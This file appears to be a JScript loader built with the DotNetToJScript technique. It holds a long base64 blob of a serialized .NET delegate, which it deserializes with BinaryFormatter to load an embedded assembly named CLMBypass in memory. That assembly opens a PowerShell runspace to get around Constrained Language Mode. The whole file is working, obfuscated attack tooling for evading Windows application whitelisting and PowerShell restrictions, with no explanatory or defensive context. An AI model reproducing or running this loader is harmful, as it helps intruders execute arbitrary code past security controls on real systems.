function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAUg5ohAAAAAAA"+
"AAAA4AAiIAsBMAAACgAAAAYAAAAAAABuKAAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAGigA"+
"AE8AAAAAQAAAeAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAIAnAAA4AAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAAB0CAAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAeAMAAABA"+
"AAAABAAAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAE4oAAAAAAAASAAAAAIABQCYIAAA6AYAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzACADMAAAAB"+
"AAARACgPAAAKCgZvEAAACgAoEQAACgsHBm8SAAAKAAcDbxMAAAomB28UAAAKJgZvFQAACgAqIgIo"+
"FgAACgAqQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAAKAIAACN+AACUAgAACAMA"+
"ACNTdHJpbmdzAAAAAJwFAAAEAAAAI1VTAKAFAAAQAAAAI0dVSUQAAACwBQAAOAEAACNCbG9iAAAA"+
"AAAAAAIAAAFHFQIACQAAAAD6ATMAFgAAAQAAABUAAAACAAAAAgAAAAEAAAAWAAAADwAAAAEAAAAB"+
"AAAAAgAAAAAA8gEBAAAAAAAGACoBqgIGAJcBqgIGAF4AUQIPAMoCAAAGAIYAOQIGAA0BOQIGAO4A"+
"OQIGAH4BOQIGAEoBOQIGAGMBOQIGAJ0AOQIGAHIAiwIGAFAAiwIGANEAOQIGALgAtQEGAOUCCwIK"+
"ADMAZAIKAAACHAIKAPYCZAIGAAEA0wEKAOMCHAIAAAAADgAAAAAAAQABAAEAEADZAtkCQQABAAEA"+
"UCAAAAAAhgAXAhAAAQCPIAAAAACGGEsCBgACAAAAAQDPAQkASwIBABEASwIGABkASwIKACkASwIQ"+
"ADEASwIQADkASwIQAEEASwIQAEkASwIQAFEASwIQAFkASwIQAGEASwIVAGkASwIQAHEASwIQAHkA"+
"SwIQAJkALQAhAIkAEgIGAJEASQAmAJEAIAArAJEA7AIxAJEAPAA3AIkAQwAGAIEASwIGAC4ACwBS"+
"AC4AEwBbAC4AGwB6AC4AIwCDAC4AKwCSAC4AMwCSAC4AOwCSAC4AQwCDAC4ASwCYAC4AUwCSAC4A"+
"WwCSAC4AYwCwAC4AawDaAC4AcwDnAEMAWwAvARoABIAAAAEAAAAAAAAAAAAAAAAA2QIAAAQAAAAA"+
"AAAAAAAAAEAAFwAAAAAAAQAAAAAAAAAAAAAASQAcAgAAAAAAAAAAAENvbGxlY3Rpb25gMQA8TW9k"+
"dWxlPgBtc2NvcmxpYgBzZXRfUnVuc3BhY2UAQ3JlYXRlUnVuc3BhY2UASW52b2tlAENsb3NlAENy"+
"ZWF0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0"+
"ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdl"+
"dEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5"+
"Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBp"+
"bGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2Vt"+
"Ymx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29t"+
"cGF0aWJpbGl0eUF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAGFyZwBTeXN0ZW0u"+
"Q29sbGVjdGlvbnMuT2JqZWN0TW9kZWwAQ0xNQnlwYXNzLmRsbABQb3dlclNoZWxsAFN5c3RlbQBP"+
"cGVuAE1haW4AU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgAu"+
"Y3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5z"+
"cGFjZXMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBp"+
"bGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAQ0xNQnlwYXNzAFBTT2JqZWN0AEFkZFNjcmlwdABS"+
"dW5zcGFjZUZhY3RvcnkAAAAAAAAA1B9NjNLNp0Cwe/06RJHbegAEIAEBCAMgAAEFIAEBEREEIAEB"+
"DgQgAQECBgcCEkUSSQQAABJFBAAAEkkFIAEBEkUFIAESSQ4IIAAVElEBElUIt3pcVhk04IkIMb84"+
"Vq02TjUIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAADgEA"+
"CUNMTUJ5cGFzcwAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAxOQAAKQEAJGI0YjhiZmJiLTI3"+
"NmMtNDBmMy05ZTQxLWE3MjZjZDEwMmVhNQAADAEABzEuMC4wLjAAAEcBABouTkVURnJhbWV3b3Jr"+
"LFZlcnNpb249djQuMAEAVA4URnJhbWV3b3JrRGlzcGxheU5hbWUQLk5FVCBGcmFtZXdvcmsgNAUB"+
"AAEAAAAAAAAAAACIdSS+AAAAAAIAAABiAAAAuCcAALgJAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAA"+
"AAAAAAAAUlNEU82KqZgqkDlOiZgBa9lBrsQBAAAAQzpcVXNlcnNcY29kZWF0aFxzb3VyY2VccmVw"+
"b3NcQ0xNQnlwYXNzXENMTUJ5cGFzc1xvYmpcRGVidWdcQ0xNQnlwYXNzLnBkYgBCKAAAAAAAAAAA"+
"AABcKAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATigAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBt"+
"c2NvcmVlLmRsbAAAAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAA"+
"AAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAHAMAAAAAAAAAAAAAHAM0AAAA"+
"VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAA"+
"AD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8A"+
"AAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBHwCAAABAFMAdAByAGkAbgBn"+
"AEYAaQBsAGUASQBuAGYAbwAAAFgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBtAG0A"+
"ZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAAA8AAoAAQBG"+
"AGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAQwBMAE0AQgB5AHAAYQBzAHMAAAAwAAgA"+
"AQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA8AA4AAQBJAG4AdABl"+
"AHIAbgBhAGwATgBhAG0AZQAAAEMATABNAEIAeQBwAGEAcwBzAC4AZABsAGwAAABIABIAAQBMAGUA"+
"ZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAx"+
"ADkAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEQADgABAE8A"+
"cgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABDAEwATQBCAHkAcABhAHMAcwAuAGQAbABs"+
"AAAANAAKAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABDAEwATQBCAHkAcABhAHMAcwAAADQA"+
"CAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBB"+
"AHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAABwOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"+
"bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA";
var entry_class = 'CLMBypass.CLMBypass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}